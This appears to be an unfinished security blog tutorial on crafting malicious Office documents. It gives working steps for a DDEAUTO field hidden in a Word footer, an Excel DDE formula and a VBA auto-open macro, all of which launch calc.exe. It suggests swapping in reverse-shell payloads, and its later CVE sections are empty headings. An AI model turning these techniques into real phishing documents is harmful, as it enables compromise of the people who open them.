Generously, attacker will use these below techniques in leveraging Microrosft Office feature and vulnerabilities:
1. Exploits
2. Macros
3. Embedded Object
4. Remote injection
and many more...

In this post, we will learn various of techniques how to make a maldocs that can execute code (in our case, we will just run the `calc.exe`). 

Why security researcher always pop-up a `calc.exe` when doing a Proof-of-Concept? Because it is simple an easy. You can always replace the `calc.exe` execution with any payload you want like *Powershell reverse shell* or *mshta fileless* or anything else that suitable your appetite but popping up a `calc.exe` indicated that this things that we play around right now, can also execute anything like download and execute malware. Not just a `calc.exe` execution.

Claim: This is for education only as to understand how maldocs were created by the attacker out there. Do with your own risk.

# DDE attack

Let's start with the DDE attack. This attack was commonly use by attacker out there, where once a victim was phished by clicking the "yes" button in the Warning message by Office, they can immidiately being compromised by the attacker.

DDEAUTO, short for automatic dynamic data exchange, is a command you can put right inside the data of an Office file to get it to pull data out of another file. In our context DDE works by executing command, that will provide the data (data provider).


## Microsoft Word

Go to `Insert` tab -> Click on `Quick Parts` -> Click on `Field`

![](2020-11-02-21-22-21.png)

Let we setup the DDEAUTO payload at footer of our document as victim supposely will not notice it hehe.

Choose `= (Formula)` field names and click `OK` button,

![](2020-11-02-21-23-26.png)

After that, you should see a Field inserted in the document with an error `!Unexpected End of Formula`. Right-click the Field, and choose `Toggle Field Codes`.

![](2020-11-02-21-28-58.png)

The field code now should display `{= \* MERGEFORMAT}`.

![](2020-11-02-21-29-25.png)

Change the field code by manually typing the payload command you want to execute. In our case, we only gonna execute our calculator app.

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
```

![](2020-11-02-21-36-29.png)

Save the document.

![](2020-11-02-21-37-33.png)

Let's execute the document. As victim, they will be welcome with these two warning message. By clicking `Yes` on both warning box, our command will be execute!

![](2020-11-02-21-38-41.png)

![](2020-11-02-21-39-53.png)

Calc.exe pop-up!

![](2020-11-02-21-40-14.png)

## Microsoft Excel

In Excel, we can embedded our DDE payload through the use of formulas feature.

Choose a box to put this payload `=cmd|'/c calc.exe'!'T81'` where T81 should be any table column number. Paste in the box and Excel will pop-up a warning. Just ignore it by click `No` for now. 

![](2020-11-02-22-04-25.png)

Then, it will display this `#REF!` text in the box.

![](2020-11-02-22-05-06.png)

Click on the Yellow Warning icon, and choose `Ignore Error`

![](2020-11-02-22-08-31.png)

then save the document.

![](2020-11-02-22-09-53.png)

Open the document and click `Enable Content`.

![](2020-11-02-22-10-38.png)

Click `yes`, and calc.exe will be pop-up!

![](2020-11-02-22-11-26.png)

![](2020-11-02-22-11-40.png)


# Microsoft Word Macro

In malware wild, macro malware is typically transmitted through phishing emails that contain malicious attachments. When the macros run, malware coded into the VBA will begin to infect all files that are opened using Microsoft Office. In our case, we will only execute a `calc.exe` app.

Click on 'view" tab

![//pic2](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic2.png)

Click Macros

![//pic3](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic3.PNG)

Type any name you want for Macro name and click "create" to create the macro

![//pic4](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic4.PNG)

On "Project" path, click ThisDocument

![//pic5](https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/images/maliciousdoc/pic5.PNG)

### Execute command

Write our malicious macro code like below

```
Private Sub Document_Open()
Test
End Sub

Private Sub DocumentOpen()
Test
End Sub

Private Sub Auto_Open()
Test
End Sub

Private Sub AutoOpen()
Test
End Sub

Private Sub Auto_Exec()
Test
End Sub

Private Sub Test()
    Shell ("cmd /c calc.exe")
End Sub
```

![](2020-11-02-22-59-48.png)

Save the document as `.doc` or `.docm` and run it!

![](2020-11-02-23-02-18.png)

![](2020-11-02-23-02-39.png)

You can also use other payload command line like powershell etc.


# Excel4Macro

# Template injection

# Inline Shapes

# ACCDE executable

# Embedded object

# PPT Hover over

# RTF

# OLE 

# CVE-2012-0158

# CVE-2017-0199

# CVE-2017-11826

# CVE 2017-11882

# Other abusing tehcniques
